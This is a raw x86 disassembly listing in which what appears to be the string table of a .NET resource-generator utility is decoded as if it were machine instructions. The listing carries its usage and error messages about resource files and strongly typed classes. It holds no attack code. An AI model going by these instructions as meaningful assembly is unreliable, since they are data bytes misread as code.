  4040fb:	jo     0x4040fd
  4040fd:	popa   
  4040fe:	add    BYTE PTR [edx+0x0],ah
  404101:	ins    BYTE PTR es:[edi],dx
  404102:	add    BYTE PTR [ebp+0x0],ah
  404105:	push   edx
  404106:	add    BYTE PTR [ebp+0x0],ah
  404109:	jae    0x40410b
  40410b:	outs   dx,DWORD PTR ds:[esi]
  40410c:	add    BYTE PTR [ebp+0x0],dh
  40410f:	jb     0x404111
  404111:	arpl   WORD PTR [eax],ax
  404113:	add    BYTE PTR gs:[ebp+0x8],dh
  404117:	add    BYTE PTR [eax],al
  404119:	or     dl,BYTE PTR [ebp+0x0]
  40411c:	jae    0x40411e
  40411e:	popa   
  40411f:	add    BYTE PTR [edi+0x0],ah
  404122:	gs add ah,dl
  404125:	or     BYTE PTR [eax],al
  404127:	add    BYTE PTR [esi+edx*2],bl
  40412a:	add    BYTE PTR [ecx+0x0],ah
  40412d:	ins    BYTE PTR es:[edi],dx
  40412e:	add    BYTE PTR [ecx+0x0],ch
  404131:	add    BYTE PTR fs:[eax+eax*1+0x61],cl
  404136:	add    BYTE PTR [esi+0x0],ch
  404139:	add    BYTE PTR [di+0x0],dh
  40413d:	popa   
  40413e:	add    BYTE PTR [edi+0x0],ah
  404141:	add    BYTE PTR gs:[ebx+0x0],dh
  404145:	cli    
  404146:	sldt   WORD PTR [eax]
  404149:	sbb    BYTE PTR [edi+0x0],dl
  40414c:	popa   
  40414d:	add    BYTE PTR [edx+0x0],dh
  404150:	outs   dx,BYTE PTR ds:[esi]
  404151:	add    BYTE PTR [ecx+0x0],ch
  404154:	outs   dx,BYTE PTR ds:[esi]
  404155:	add    BYTE PTR [edi+0x0],ah
  404158:	inc    ebx
  404159:	add    BYTE PTR [edi+0x0],ch
  40415c:	jne    0x40415e
  40415e:	outs   dx,BYTE PTR ds:[esi]
  40415f:	add    BYTE PTR [eax+eax*1+0x34],dh
  404163:	adc    BYTE PTR [eax],al
  404165:	add    BYTE PTR [edi+edx*2],dl
  404168:	add    BYTE PTR [edx+0x0],dh
  40416b:	imul   eax,DWORD PTR [eax],0x650074
  404171:	inc    ebp
  404172:	add    BYTE PTR [edx+0x0],dh
  404175:	jb     0x404177
  404177:	outs   dx,DWORD PTR ds:[esi]
  404178:	add    BYTE PTR [edx+0x0],dh
  40417b:	inc    esi
  40417c:	adc    BYTE PTR [eax],al
  40417e:	add    BYTE PTR [ecx],al
  404180:	inc    ecx
  404181:	push   ebp
  404182:	outs   dx,BYTE PTR ds:[esi]
  404183:	jb     0x4041ea
  404185:	arpl   WORD PTR [edi+0x67],bp
  404188:	outs   dx,BYTE PTR ds:[esi]
  404189:	imul   edi,DWORD PTR [edx+0x65],0x77732064
  404190:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x7b22203a
  404198:	xor    BYTE PTR [ebp+0x22],bh
  40419b:	and    BYTE PTR cs:[eax],ah
  40419e:	push   ebp
  40419f:	jae    0x404206
  4041a1:	and    BYTE PTR [edx+0x65],dl
  4041a4:	jae    0x4041ed
  4041a6:	outs   dx,BYTE PTR gs:[esi]
  4041a8:	and    BYTE PTR [edi],ch
  4041aa:	aas    
  4041ab:	and    BYTE PTR [esi+0x6f],ah
  4041ae:	jb     0x4041d0
  4041b0:	jne    0x404225
  4041b2:	popa   
  4041b3:	and    BYTE PTR gs:[bx+di+0x6e],ch
  4041b8:	outs   dx,WORD PTR ds:[esi]
  4041ba:	jb     0x404229
  4041bc:	popa   
  4041bd:	je     0x404228
  4041bf:	outs   dx,DWORD PTR ds:[esi]
  4041c0:	outs   dx,BYTE PTR ds:[esi]
  4041c1:	add    DWORD PTR cs:[ebp+0x55],edx
  4041c5:	outs   dx,BYTE PTR ds:[esi]
  4041c6:	jae    0x40423d
  4041c8:	jo     0x40423a
  4041ca:	outs   dx,DWORD PTR ds:[esi]
  4041cb:	jb     0x404241
  4041cd:	gs and BYTE PTR fs:[edi+0x72],ch
  4041d2:	and    BYTE PTR [ecx+0x6e],ch
  4041d5:	jbe    0x404238
  4041d7:	ins    BYTE PTR es:[edi],dx
  4041d8:	imul   esp,DWORD PTR [eax+eiz*1+0x65],0x70616373
  4041e0:	and    BYTE PTR gs:[ebx+0x68],ah
  4041e4:	popa   
  4041e5:	jb     0x404248
  4041e7:	arpl   WORD PTR [ebp+eiz*2+0x72],si
  4041eb:	and    BYTE PTR [ecx+0x6e],ch
  4041ee:	and    BYTE PTR [esi+0x61],dh
  4041f1:	ins    BYTE PTR es:[edi],dx
  4041f2:	jne    0x404259
  4041f4:	and    DWORD PTR [eax],esp
  4041f6:	and    BYTE PTR [ebp+0x73],al
  4041f9:	arpl   WORD PTR [ecx+0x70],sp
  4041fc:	and    BYTE PTR gs:[ebx+0x68],ah
  404200:	popa   
  404201:	jb     0x40423d
  404203:	and    BYTE PTR [edi],ah
  404205:	jnp    0x404237
  404207:	jge    0x404230
  404209:	and    BYTE PTR [esi+0x61],cl
  40420c:	ins    DWORD PTR es:[edi],dx
  40420d:	and    BYTE PTR gs:[edi+0x61],dh
  404211:	jae    0x40424d
  404213:	and    BYTE PTR [edx],ah
  404215:	jnp    0x404248
  404217:	jge    0x40423b
  404219:	add    DWORD PTR [ebp+0x54],esi
  40421c:	push   0x69662065
  404221:	ins    BYTE PTR es:[edi],dx
  404222:	and    BYTE PTR gs:[esi+0x61],ch
  404226:	ins    DWORD PTR es:[edi],dx
  404227:	gs and BYTE PTR fs:[edx],ah
  40422b:	jnp    0x40425d
  40422d:	jge    0x404251
  40422f:	and    BYTE PTR [edi+ebp*2+0x65],ah
  404233:	jae    0x404255
  404235:	outs   dx,BYTE PTR ds:[esi]
  404236:	outs   dx,DWORD PTR ds:[esi]
  404237:	je     0x404259
  404239:	push   0x20657661
  40423e:	popa   
  40423f:	and    BYTE PTR [ebx+0x6e],ch
  404242:	outs   dx,DWORD PTR ds:[esi]
  404243:	ja     0x4042b3
  404245:	and    BYTE PTR [ebp+0x78],ah
  404248:	je     0x4042af
  40424a:	outs   dx,BYTE PTR ds:[esi]
  40424b:	jae    0x4042b6
  40424d:	outs   dx,DWORD PTR ds:[esi]
  40424e:	outs   dx,BYTE PTR ds:[esi]
  40424f:	and    BYTE PTR cs:[eax],ah
  404252:	dec    ebp
  404253:	popa   
  404254:	outs   dx,BYTE PTR ds:[esi]
  404255:	popa   
  404256:	gs and BYTE PTR fs:[bp+si+0x65],dh
  40425c:	jae    0x4042cd
  40425e:	jne    0x4042d2
  404260:	arpl   WORD PTR [ebp+0x20],sp
  404263:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6d20
  40426a:	jne    0x4042df
  40426c:	je     0x40428e
  40426e:	outs   dx,BYTE PTR gs:[esi]
  404270:	and    BYTE PTR fs:[ecx+0x6e],ch
  404274:	and    BYTE PTR [esi],ch
  404276:	push   edx
  404277:	gs jae 0x4042d2
  40427a:	sub    al,0x20
  40427c:	cs je  0x4042f7
  40427f:	je     0x4042ad
  404281:	and    BYTE PTR [edi+0x72],ch
  404284:	and    BYTE PTR [esi],ch
  404286:	jb     0x4042ed
  404288:	jae    0x4042f9
  40428a:	jne    0x4042fe
  40428c:	arpl   WORD PTR [ebp+0x73],sp
  40428f:	add    DWORD PTR cs:[ecx],esi
  404292:	inc    ebx
  404293:	jb     0x4042fa
  404295:	popa   
  404296:	je     0x404301
  404298:	outs   dx,BYTE PTR ds:[esi]
  404299:	and    BYTE PTR [bp+di+0x74],dh
  40429d:	jb     0x40430e
  40429f:	outs   dx,BYTE PTR ds:[esi]
  4042a0:	ins    BYTE PTR es:[di],dx
  4042a2:	jns    0x4042c4
  4042a4:	je     0x40431f
  4042a6:	jo     0x40430d
  4042a8:	and    BYTE PTR fs:[edx+0x65],dh
  4042ac:	jae    0x40431d
  4042ae:	jne    0x404322
  4042b0:	arpl   WORD PTR [ebp+0x20],sp
  4042b3:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  4042b7:	jae    0x4042d9
  4042b9:	and    bh,BYTE PTR [ebx+0x30]
  4042bc:	jge    0x4042e0
  4042be:	cs cs and BYTE PTR cs:[eax],ah
  4042c3:	add    DWORD PTR ds:0x61657243,esi
  4042c9:	je     0x404334
  4042cb:	outs   dx,BYTE PTR ds:[esi]
  4042cc:	and    BYTE PTR [bp+di+0x74],dh
  4042d0:	jb     0x404341
  4042d2:	outs   dx,BYTE PTR ds:[esi]
  4042d3:	ins    BYTE PTR es:[di],dx
  4042d5:	jns    0x4042f7
  4042d7:	je     0x404352
  4042d9:	jo     0x404340
  4042db:	and    BYTE PTR fs:[edx+0x65],dh
  4042df:	jae    0x404350
  4042e1:	jne    0x404355
  4042e3:	arpl   WORD PTR [ebp+0x20],sp
  4042e6:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  4042ea:	jae    0x40430c
  4042ec:	and    bh,BYTE PTR [ebx+0x30]
  4042ef:	jge    0x40431f
  4042f1:	jnp    0x404324
  4042f3:	jge    0x404317
  4042f5:	cs cs and BYTE PTR cs:[eax],ah
  4042fa:	add    DWORD PTR [edx],ebx
  4042fc:	push   edi
  4042fd:	jb     0x404368
  4042ff:	je     0x40436a
  404301:	outs   dx,BYTE PTR ds:[esi]
  404302:	and    BYTE PTR [bp+si+0x65],dh
  404306:	jae    0x404377
  404308:	jne    0x40437c
  40430a:	arpl   WORD PTR [ebp+0x20],sp
  40430d:	imul   bp,WORD PTR [ebp+eiz*2+0x2e],0x2e2e
  404314:	and    BYTE PTR [eax],ah
  404316:	add    DWORD PTR [ebp+0x43],eax
  404319:	outs   dx,DWORD PTR ds:[esi]
  40431a:	jne    0x404388
  40431c:	and    BYTE PTR fs:[esi+0x6f],ch
  404320:	je     0x404342
  404322:	ins    BYTE PTR es:[edi],dx
  404323:	outs   dx,DWORD PTR ds:[esi]
  404324:	popa   
  404325:	and    BYTE PTR fs:[edx+0x65],dh
  404329:	data16 gs jb 0x404392
  40432d:	outs   dx,BYTE PTR ds:[esi]
  40432e:	arpl   WORD PTR [ebp+0x64],sp
  404331:	and    BYTE PTR [ecx+0x73],ah
  404334:	jae    0x40439b
  404336:	ins    DWORD PTR es:[edi],dx
  404337:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40433b:	and    bh,BYTE PTR [ebx+0x30]
  40433e:	jge    0x404362
  404340:	and    BYTE PTR cs:[eax],ah
  404343:	inc    ebx
  404344:	popa   
  404345:	jne    0x4043ae
  404347:	push   0x20612074
  40434c:	jnp    0x40437f
  40434e:	jge    0x404370
  404350:	jae    0x4043b3
  404352:	jns    0x4043bd
  404354:	outs   dx,BYTE PTR ds:[esi]
  404355:	and    BYTE PTR [bp+si],ah
  404358:	jnp    0x40438c
  40435a:	jge    0x40437e
  40435c:	cs add esi,ebp
  40435f:	add    DWORD PTR [eax+ebp*2+0x65],edx
  404363:	and    BYTE PTR [edx+0x61],ah
  404366:	jae    0x4043cd
  404368:	and    BYTE PTR [esi+0x61],ch
  40436b:	ins    DWORD PTR es:[edi],dx
  40436c:	and    BYTE PTR gs:[edi+0x66],ch
  404370:	and    BYTE PTR [ecx+0x6f],bh
  404373:	jne    0x4043e7
  404375:	and    BYTE PTR [edi+0x75],ch
  404378:	je     0x4043ea
  40437a:	jne    0x4043f0
  40437c:	and    BYTE PTR [esi+0x69],ah
  40437f:	ins    BYTE PTR es:[edi],dx
  404380:	gs sub al,0x20
  404383:	and    bh,BYTE PTR [ebx+0x30]
  404386:	jge    0x4043aa
  404388:	sub    al,0x20
  40438a:	outs   dx,DWORD PTR fs:[esi]
  40438c:	gs jae 0x4043af
  40438f:	outs   dx,BYTE PTR ds:[esi]
  404390:	outs   dx,DWORD PTR ds:[esi]
  404391:	je     0x4043b3
  404393:	ins    DWORD PTR es:[edi],dx
  404394:	popa   
  404395:	je     0x4043fa
  404397:	push   0x65687420
  40439c:	and    BYTE PTR [edx+0x61],ah
  40439f:	jae    0x404406
  4043a1:	and    BYTE PTR [esi+0x61],ch
  4043a4:	ins    DWORD PTR es:[edi],dx
  4043a5:	and    BYTE PTR gs:[ebp+0x73],dh
  4043a9:	gs and BYTE PTR fs:[edx+0x79],ah
  4043ae:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4043b2:	and    BYTE PTR [ebx+0x74],dh
  4043b5:	jb     0x404426
  4043b7:	outs   dx,BYTE PTR ds:[esi]
  4043b8:	ins    BYTE PTR es:[di],dx
  4043ba:	jns    0x4043dc
  4043bc:	je     0x404437
  4043be:	jo     0x404425
  4043c0:	and    BYTE PTR fs:[edx+0x65],dh
  4043c4:	jae    0x404435
  4043c6:	jne    0x40443a
  4043c8:	arpl   WORD PTR [ebp+0x73],sp
  4043cb:	sub    al,0x20
  4043cd:	and    bh,BYTE PTR [ebx+0x31]
  4043d0:	jge    0x4043f4
  4043d2:	and    BYTE PTR cs:[eax],ah
  4043d5:	dec    ecx
  4043d6:	outs   dx,BYTE PTR ds:[esi]
  4043d7:	and    BYTE PTR [edi+0x72],ch
  4043da:	fs gs jb 0x4043fe
  4043de:	outs   dx,WORD PTR ds:[esi]
  4043e0:	jb     0x404402
  4043e2:	je     0x40444c
  4043e4:	and    BYTE PTR gs:[ebx+0x74],dh
  4043e8:	jb     0x404459
  4043ea:	outs   dx,BYTE PTR ds:[esi]
  4043eb:	ins    BYTE PTR es:[di],dx
  4043ed:	jns    0x40440f
  4043ef:	je     0x40446a
  4043f1:	jo     0x404458
  4043f3:	and    BYTE PTR fs:[edx+0x65],dh
  4043f7:	jae    0x404468
  4043f9:	jne    0x40446d
  4043fb:	arpl   WORD PTR [ebp+0x73],sp
  4043fe:	and    BYTE PTR [edi+ebp*2+0x20],dh
  404402:	ja     0x404473
  404404:	jb     0x404471
  404406:	and    BYTE PTR [ebx+0x6f],ah
  404409:	jb     0x40447d
  40440b:	arpl   WORD PTR gs:[esp+ebp*2+0x79],si
  404410:	sub    al,0x20
  404412:	jns    0x404483
  404414:	jne    0x404436
  404416:	ja     0x404481
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	ins    BYTE PTR es:[edi],dx
  40441a:	and    BYTE PTR [esi+0x65],ch
  40441d:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  404423:	jb     0x40448a
  404425:	outs   dx,BYTE PTR ds:[esi]
  404426:	popa   
  404427:	ins    DWORD PTR es:[edi],dx
  404428:	and    BYTE PTR gs:[ecx+0x6f],bh
  40442c:	jne    0x4044a0
  40442e:	and    BYTE PTR [edi+0x75],ch
  404431:	je     0x4044a3
  404433:	jne    0x4044a9
  404435:	and    BYTE PTR [esi+0x69],ah
  404438:	ins    BYTE PTR es:[edi],dx
  404439:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  40443e:	and    bh,BYTE PTR [ebx+0x31]
  404441:	jge    0x404471
  404443:	jb     0x4044aa
  404445:	jae    0x4044b6
  404447:	jne    0x4044bb
  404449:	arpl   WORD PTR [ebp+0x73],sp
  40444c:	and    ch,BYTE PTR [esi]
  40444e:	add    edi,esp
  404450:	add    DWORD PTR [ebx+0x61],eax
  404453:	outs   dx,BYTE PTR ds:[esi]
  404454:	outs   dx,BYTE PTR ds:[esi]
  404455:	outs   dx,DWORD PTR ds:[esi]
  404456:	je     0x404478
  404458:	jne    0x4044cd
  40445a:	and    BYTE PTR gs:[edi],ch
  40445d:	arpl   WORD PTR [edi+0x6d],bp
  404460:	jo     0x4044cb
  404462:	ins    BYTE PTR es:[edi],dx
  404463:	and    BYTE PTR gs:[esi],ah
  404466:	and    BYTE PTR [edi],ch
  404468:	jae    0x4044de
  40446a:	jb     0x40448c
  40446c:	jae    0x4044d7
  40446e:	ins    DWORD PTR es:[edi],dx
  40446f:	jne    0x4044dd
  404471:	je     0x4044d4
  404473:	outs   dx,BYTE PTR ds:[esi]
  404474:	outs   dx,DWORD PTR gs:[esi]
  404476:	jne    0x4044eb
  404478:	ins    BYTE PTR es:[edi],dx
  404479:	jns    0x40449b
  40447b:	imul   esp,DWORD PTR [esi+0x20],0x20756f79
  404482:	jae    0x4044f4
  404484:	arpl   WORD PTR gs:[ecx+0x66],bp
  404488:	jns    0x4044aa
  40448a:	popa   
  40448b:	and    BYTE PTR [ebx+0x6c],ah
  40448e:	popa   
  40448f:	jae    0x404504
  404491:	and    BYTE PTR [esi+0x61],ch
  404494:	ins    DWORD PTR es:[edi],dx
  404495:	and    BYTE PTR gs:[edi+0x72],ch
  404499:	and    BYTE PTR [ecx+0x6e],ah
  40449c:	and    BYTE PTR [edi+0x75],ch
  40449f:	je     0x404511
  4044a1:	jne    0x404517
  4044a3:	and    BYTE PTR [esi+0x69],ah
  4044a6:	ins    BYTE PTR es:[edi],dx
  4044a7:	and    BYTE PTR gs:[esi+0x61],ch
  4044ab:	ins    DWORD PTR es:[edi],dx
  4044ac:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  4044b1:	je     0x40451b
  4044b3:	and    BYTE PTR gs:[edi],ch
  4044b6:	jae    0x40452c
  4044b8:	jb     0x4044da
  4044ba:	jae    0x404533
  4044bc:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736120
  4044c4:	ja     0x40452b
  4044c6:	ins    BYTE PTR es:[edi],dx
  4044c7:	ins    BYTE PTR es:[edi],dx
  4044c8:	and    BYTE PTR [ecx+0x73],ah
  4044cb:	and    BYTE PTR [ebp+0x75],ch
  4044ce:	ins    BYTE PTR es:[edi],dx
  4044cf:	je     0x40453a
  4044d1:	jo     0x40453f
  4044d3:	and    BYTE PTR gs:[ecx+0x6e],ch
  4044d7:	jo     0x40454e
  4044d9:	je     0x4044fb
  4044db:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x7420
  4044e2:	outs   dx,DWORD PTR ds:[esi]
  4044e3:	and    BYTE PTR [edi],ch
  4044e5:	arpl   WORD PTR [edi+0x6d],bp
  4044e8:	jo     0x404553
  4044ea:	ins    BYTE PTR es:[edi],dx
  4044eb:	gs and BYTE PTR cs:[eax],ah
  4044ef:	pop    ecx
  4044f0:	outs   dx,DWORD PTR ds:[esi]
  4044f1:	jne    0x404513
  4044f3:	ja     0x404564
  4044f5:	jne    0x404563
  4044f7:	and    BYTE PTR fs:[ebp+0x6e],ah
  4044fb:	and    BYTE PTR fs:[ebp+0x70],dh
  4044ff:	and    BYTE PTR [edi+0x69],dh
  404502:	je     0x40456c
  404504:	and    BYTE PTR [ebp+esi*2+0x70],ah
  404508:	ins    BYTE PTR es:[edi],dx
  404509:	imul   esp,DWORD PTR [ebx+0x61],0x63206574
  404510:	ins    BYTE PTR es:[edi],dx
  404511:	popa   
  404512:	jae    0x404587
  404514:	gs jae 0x404537
  404517:	outs   dx,DWORD PTR ds:[esi]
  404518:	jb     0x40453a
  40451a:	outs   dx,DWORD PTR ds:[esi]
  40451b:	jbe    0x404582
  40451d:	jb     0x404596
  40451f:	jb     0x40458a
  404521:	je     0x404588
  404523:	and    BYTE PTR [edi+0x6e],ch
  404526:	and    BYTE PTR gs:[edi+0x66],ch
  40452a:	and    BYTE PTR [ecx+0x6f],bh
  40452d:	jne    0x4045a1
  40452f:	and    BYTE PTR [ebx+0x6c],ah
  404532:	popa   
  404533:	jae    0x4045a8
  404535:	gs jae 0x404566
  404538:	add    DWORD PTR [esi+ebp*1],esi
  40453b:	jb     0x4045a2
  40453d:	jae    0x4045ae
  40453f:	jne    0x4045b3
  404541:	arpl   WORD PTR [ebp+0x73],sp
  404544:	and    BYTE PTR [esi+0x69],ah
  404547:	ins    BYTE PTR es:[edi],dx
  404548:	and    BYTE PTR gs:[ecx+0x73],ch
  40454c:	and    BYTE PTR [eax+0x6f],dh
  40454f:	jae    0x4045c4
  404551:	imul   esp,DWORD PTR [edx+0x6c],0x6f632079
  404558:	jb     0x4045cc
  40455a:	jne    0x4045cc
  40455c:	je     0x40458c
  40455e:	and    BYTE PTR [eax],ah
  404560:	inc    esp
  404561:	gs ins BYTE PTR es:[edi],dx
  404563:	gs je  0x4045cf
  404566:	outs   dx,BYTE PTR ds:[esi]
  404567:	and    BYTE PTR [bp+si],ah
  40456a:	jnp    0x40459c
  40456c:	jge    0x404590
  40456e:	add    DWORD PTR [esi],esi
  404570:	inc    ebx
  404571:	outs   dx,DWORD PTR ds:[esi]
  404572:	jne    0x4045e0
  404574:	and    BYTE PTR fs:[esi+0x6f],ch
  404578:	je     0x40459a
  40457a:	fs gs ins BYTE PTR es:[edi],dx
  40457d:	gs je  0x4045e5
  404580:	and    BYTE PTR [eax+0x6f],dh
  404583:	jae    0x4045f8
  404585:	imul   esp,DWORD PTR [edx+0x6c],0x6f632079
  40458c:	jb     0x404600
  40458e:	jne    0x404600
  404590:	je     0x4045f7
  404592:	and    BYTE PTR fs:[edi+0x75],ch
  404596:	je     0x404608
  404598:	jne    0x40460e
  40459a:	and    BYTE PTR [esi+0x69],ah
  40459d:	ins    BYTE PTR es:[edi],dx
  40459e:	and    BYTE PTR gs:[edx],ah
  4045a1:	jnp    0x4045d3
  4045a3:	jge    0x4045c7
  4045a5:	add    DWORD PTR cs:0x656e6f44,eax
  4045ac:	add    DWORD PTR cs:[eax],ebp
  4045af:	inc    esp
  4045b0:	jne    0x404622
  4045b2:	ins    BYTE PTR es:[edi],dx
  4045b3:	imul   esp,DWORD PTR [ebx+0x61],0x72206574
  4045ba:	gs jae 0x40462c
  4045bd:	jne    0x404631
  4045bf:	arpl   WORD PTR [ebp+0x20],sp
  4045c2:	imul   esp,DWORD PTR [ebp+0x79],0x21
  4045c6:	and    BYTE PTR [eax],ah
  4045c8:	dec    esi
  4045c9:	popa   
  4045ca:	ins    DWORD PTR es:[edi],dx
  4045cb:	and    BYTE PTR gs:[edi+0x61],dh
  4045cf:	jae    0x40460b
  4045d1:	and    BYTE PTR [edx],ah
  4045d3:	jnp    0x404605
  4045d5:	jge    0x4045f9
  4045d7:	add    DWORD PTR ds:0x207d307b,ecx
  4045dd:	gs jb  0x404652
  4045e0:	outs   dx,DWORD PTR ds:[esi]
  4045e1:	jb     0x40460b
  4045e3:	jae    0x40460e
  4045e5:	add    DWORD PTR cs:[esi],ebx
  4045e8:	inc    ebx
  4045e9:	outs   dx,DWORD PTR ds:[esi]
  4045ea:	jne    0x404658
  4045ec:	outs   dx,BYTE PTR fs:[esi]
  4045ee:	daa    
  4045ef:	je     0x404611
  4045f1:	imul   bp,WORD PTR [esi+0x64],0x6920
  4045f7:	outs   dx,BYTE PTR ds:[esi]
  4045f8:	jo     0x40466f
  4045fa:	je     0x40461c
  4045fc:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x7b22
  404603:	xor    BYTE PTR [ebp+0x22],bh
  404606:	add    DWORD PTR [ecx],ebp
  404608:	inc    ebp
  404609:	jb     0x40467d
  40460b:	outs   dx,DWORD PTR ds:[esi]
  40460c:	jb     0x40462e
  40460e:	ja     0x404678
  404610:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x74697277
  404618:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  40461f:	and    BYTE PTR [edi+0x75],ch
  404622:	je     0x404694
  404624:	jne    0x40469a
  404626:	and    BYTE PTR [esi+0x69],ah
  404629:	ins    BYTE PTR es:[edi],dx
  40462a:	and    BYTE PTR gs:[edx],ah
  40462d:	jnp    0x40465f
  40462f:	jge    0x404653
  404631:	add    DWORD PTR [eax+0x55],ebp
  404634:	outs   dx,BYTE PTR ds:[esi]
  404635:	gs js  0x4046a8
  404638:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  40463d:	and    BYTE PTR [ecx+0x4e],cl
  404640:	inc    esi
  404641:	and    BYTE PTR [esi+0x69],ah
  404644:	ins    BYTE PTR es:[edi],dx
  404645:	and    BYTE PTR gs:[edx+0x72],ah
  404649:	popa   
  40464a:	arpl   WORD PTR [ebx+0x65],bp
  40464d:	je     0x40466f
  40464f:	jae    0x4046ca
  404651:	outs   dx,BYTE PTR ds:[esi]
  404652:	je     0x4046b5
  404654:	js     0x404676
  404656:	sub    eax,0x73655220
  40465b:	inc    edi
  40465c:	outs   dx,BYTE PTR gs:[esi]
  40465e:	and    BYTE PTR [edi+ebp*2+0x65],ah
  404662:	jae    0x404684
  404664:	outs   dx,BYTE PTR ds:[esi]
  404665:	outs   dx,DWORD PTR ds:[esi]
  404666:	je     0x404688
  404668:	jae    0x4046df
  40466a:	jo     0x4046dc
  40466c:	outs   dx,DWORD PTR ds:[esi]
  40466d:	jb     0x4046e3
  40466f:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  404673:	je     0x404695
  404675:	imul   ebp,DWORD PTR [esi+0x20],0x61757173
  40467c:	jb     0x4046e3
  40467e:	and    BYTE PTR [edx+0x72],ah
  404681:	popa   
  404682:	arpl   WORD PTR [ebx+0x65],bp
  404685:	je     0x4046fa
  404687:	and    BYTE PTR cs:[eax],ah
  40468a:	inc    edx
  40468b:	popa   
  40468c:	and    BYTE PTR fs:[ebp+eiz*2+0x78],dh
  404691:	je     0x4046cd
  404693:	and    BYTE PTR [edx],ah
  404695:	pop    ebx
  404696:	jnp    0x4046c8
  404698:	jge    0x4046bc
  40469a:	add    DWORD PTR cs:[ecx+ecx*2+0x6e],esp
  40469f:	jbe    0x404702
  4046a1:	ins    BYTE PTR es:[edi],dx
  4046a2:	imul   esp,DWORD PTR [eax+eiz*1+0x63],0x616d6d6f
  4046aa:	outs   dx,BYTE PTR ds:[esi]
  4046ab:	and    BYTE PTR fs:[ecx+ebp*2+0x6e],ch
  4046b0:	and    BYTE PTR gs:[ebx+0x79],dh
  4046b4:	outs   dx,BYTE PTR ds:[esi]
  4046b5:	je     0x404718
  4046b7:	js     0x4046e7
  4046b9:	and    BYTE PTR [eax],ah
  4046bb:	push   ebx
  4046bc:	ja     0x404727
  4046be:	je     0x404723
  4046c0:	push   0x7b22203a
  4046c5:	xor    BYTE PTR [ebp+0x22],bh
  4046c8:	and    BYTE PTR [eax],ah
  4046ca:	inc    edx
  4046cb:	popa   
  4046cc:	and    BYTE PTR fs:[esi+0x61],dh
  4046d0:	ins    BYTE PTR es:[edi],dx
  4046d1:	jne    0x404738
  4046d3:	cmp    ah,BYTE PTR [eax]
  4046d5:	and    bh,BYTE PTR [ebx+0x31]
  4046d8:	jge    0x4046fc
  4046da:	and    BYTE PTR cs:[eax],ah
  4046dd:	push   ebp
  4046de:	jae    0x404745
  4046e0:	and    BYTE PTR [edx+0x65],dl
  4046e3:	jae    0x40472c
  4046e5:	outs   dx,BYTE PTR gs:[esi]
  4046e7:	and    BYTE PTR [edi],ch
  4046e9:	aas    
  4046ea:	and    BYTE PTR [esi+0x6f],ah
  4046ed:	jb     0x40470f
  4046ef:	jne    0x404764
  4046f1:	popa   
  4046f2:	and    BYTE PTR gs:[bx+di+0x6e],ch
  4046f7:	outs   dx,WORD PTR ds:[esi]
  4046f9:	jb     0x404768
  4046fb:	popa   
  4046fc:	je     0x404767
  4046fe:	outs   dx,DWORD PTR ds:[esi]
  4046ff:	outs   dx,BYTE PTR ds:[esi]
  404700:	add    DWORD PTR cs:[esi+0x49],eax
  404704:	outs   dx,BYTE PTR ds:[esi]
  404705:	jbe    0x404768
  404707:	ins    BYTE PTR es:[edi],dx
  404708:	imul   esp,DWORD PTR [eax+eiz*1+0x66],0x616d726f
  404710:	je     0x404732
  404712:	outs   dx,DWORD PTR ds:[esi]
  404713:	jb     0x404735
  404715:	arpl   WORD PTR [edi+0x6e],bp
  404718:	je     0x40477f
  40471a:	outs   dx,BYTE PTR ds:[esi]
  40471b:	je     0x404790
  40471d:	and    BYTE PTR [ecx+0x6e],ch
  404720:	and    BYTE PTR [ecx+0x6e],ch
  404723:	jo     0x40479a
  404725:	je     0x404755
  404727:	and    BYTE PTR [edx],ah
  404729:	jnp    0x40475b
  40472b:	jge    0x40474f
  40472d:	and    BYTE PTR [ebp+0x72],ah
  404730:	jb     0x4047a1
  404732:	jb     0x404754
  404734:	je     0x4047a8
  404736:	jns    0x4047a1
  404738:	outs   dx,BYTE PTR ds:[esi]
  404739:	and    BYTE PTR [si+0x6f],dh
  40473d:	and    BYTE PTR [edx+0x65],dh
  404740:	popa   
  404741:	and    BYTE PTR fs:[ecx+0x6e],ch
  404745:	jo     0x4047bc
  404747:	je     0x404777
  404749:	add    DWORD PTR [ebp+0x59],ebp
  40474c:	outs   dx,DWORD PTR ds:[esi]
  40474d:	jne    0x40476f
  40474f:	ins    DWORD PTR es:[edi],dx
  404750:	jne    0x4047c5
  404752:	je     0x404774
  404754:	jae    0x4047c6
  404756:	arpl   WORD PTR gs:[ecx+0x66],bp
  40475a:	jns    0x40477c
  40475c:	popa   
  40475d:	outs   dx,BYTE PTR ds:[esi]
  40475e:	and    BYTE PTR [ecx+0x6e],ch
  404761:	jo     0x4047d8
  404763:	je     0x404785
  404765:	and    BYTE PTR es:[edi+0x75],ch
  404769:	je     0x4047d1
  40476b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x656c6966
  404773:	and    BYTE PTR [esi+0x61],ch
  404776:	ins    DWORD PTR es:[edi],dx
  404777:	and    BYTE PTR gs:[ecx+ebp*2+0x6b],ch
  40477c:	and    BYTE PTR gs:[eax+ebp*2+0x69],dh
  404781:	jae    0x4047bd
  404783:	or     eax,0x466e690a
  404788:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x2c747874
  404790:	outs   dx,DWORD PTR ds:[esi]
  404791:	jne    0x404807
  404793:	inc    esi
  404794:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x6f736572
  40479c:	jne    0x404810
  40479e:	arpl   WORD PTR [ebp+0x73],sp
  4047a1:	cs or  eax,0x756f590a
  4047a7:	and    BYTE PTR [eax+0x61],dh
  4047aa:	jae    0x40481f
  4047ac:	gs and BYTE PTR fs:[ecx+0x6e],ch
